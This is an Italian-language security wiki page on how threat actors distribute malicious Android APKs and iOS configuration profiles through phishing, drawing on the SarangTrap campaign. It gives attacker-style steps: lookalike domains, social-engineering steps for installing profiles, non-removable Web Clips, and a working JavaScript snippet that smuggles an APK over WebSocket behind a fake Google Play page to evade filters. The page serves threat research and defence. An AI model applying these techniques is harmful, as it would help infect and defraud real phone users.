# Phishing mobile e distribuzione di app malevole (Android e iOS)

> [!INFO]
> Questa pagina tratta le tecniche utilizzate dai threat actor per distribuire **APK Android malevoli** e **profili di configurazione mobile iOS** tramite phishing (SEO, social engineering, store contraffatti, app di dating, ecc.).
> Il materiale è adattato dalla campagna SarangTrap, esposta da Zimperium zLabs (2025), e da altre ricerche pubbliche.<sup>[[1]](#references)</sup>

## Flusso dell'attacco

1. **Infrastruttura SEO/Phishing**
* Registrare decine di domini simili a quelli legittimi (dating, condivisione cloud, servizi automobilistici…).
– Utilizzare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per ottenere un buon posizionamento su Google.
– Ospitare le istruzioni di installazione sia per Android (`.apk`) sia per iOS sulla stessa landing page.
2. **Download del primo stadio**
* Android: link diretto a un APK *unsigned* o proveniente da uno “store di terze parti”.
* iOS: link `itms-services://` o HTTPS semplice a un profilo **mobileconfig** malevolo (vedi sotto).
3. **Comportamento post-installazione su Android**
* L'esecuzione controllata dal C2, l'abuso dei permessi, i bypass dei dropper, la raccolta in background e altri comportamenti malware post-installazione sono descritti nella pagina dedicata Android Malware Post-Exploitation riportata sotto.
4. **Tecnica di delivery su iOS**
* Un singolo **profilo di configurazione mobile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per sottoporre il dispositivo a una supervisione simile a “MDM”.
* Istruzioni di social engineering:
1. Aprire Impostazioni ➜ *Profilo scaricato*.
2. Toccare *Installa* tre volte (screenshot nella pagina di phishing).
3. Considerare attendibile il profilo unsigned ➜ l'attaccante ottiene i privilegi *Contacts* e *Photo* senza la revisione dell'App Store.
5. **Payload iOS Web Clip (icona dell'app di phishing)**
* I payload `com.apple.webClip.managed` possono **fissare un URL di phishing alla schermata Home** con un'icona/etichetta personalizzata.
* I Web Clip possono essere eseguiti **a schermo intero** (nascondendo l'interfaccia del browser) e impostati come **non rimovibili**, costringendo la vittima a eliminare il profilo per rimuovere l'icona.<sup>[[3]](#references)</sup>
6. **Livello di rete**
* HTTP semplice, spesso sulla porta 80 con un header HOST come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (nessun TLS → facile da individuare).

## Android Malware Post-Exploitation

Per le tecniche di post-installazione dei malware Android, come C2, abuso di Accessibility, overlay, automazione ATS, caricamento DEX staged, SMS premium e persistenza, consulta la pagina dedicata:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling basato su Socket.IO/WebSocket + pagine Google Play contraffatte

Gli attaccanti sostituiscono sempre più spesso i link APK statici con un canale Socket.IO/WebSocket incorporato in esche dall'aspetto simile a Google Play. Questo nasconde l'URL del payload, aggira i filtri basati su URL/estensione e mantiene un'esperienza di installazione realistica.<sup>[[2]](#references)[[4]](#references)</sup>

Flusso tipico del client osservato in campagne reali:

<details>
<summary>Downloader Play contraffatto basato su Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Perché elude i controlli semplici:
- Non viene esposto alcun URL statico dell'APK; il payload viene ricostruito in memoria a partire dai frame WebSocket.
- I filtri per URL/MIME/estensione che bloccano le risposte dirette `.apk` potrebbero non rilevare dati binari incanalati tramite WebSocket/Socket.IO.
- I crawler e le URL sandbox che non eseguono WebSocket non recupereranno il payload.

Vedi anche tradecraft e strumenti WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Il lato oscuro del romance: campagna di estorsione SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Impostazioni del payload Web Clips per dispositivi Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan Banker mirato agli utenti Android indonesiani e vietnamiti](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
